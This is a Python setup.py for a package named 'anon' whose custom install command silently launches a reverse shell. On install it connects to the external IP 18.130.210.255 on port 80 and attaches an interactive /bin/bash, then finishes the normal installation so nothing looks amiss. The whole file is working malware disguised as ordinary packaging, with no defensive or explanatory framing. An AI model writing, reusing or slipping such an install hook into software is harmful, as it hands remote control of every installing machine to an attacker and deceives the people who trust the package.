from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class CustomInstall(install):
    def run(self):
        # The reverse shell payload
        payload = 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.130.210.255",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
        subprocess.Popen(['python3', '-c', payload])
        # Continue with the normal installation
        install.run(self)

setup(
    name='anon',
    version='0.1',
    cmdclass={'install': CustomInstall}
)
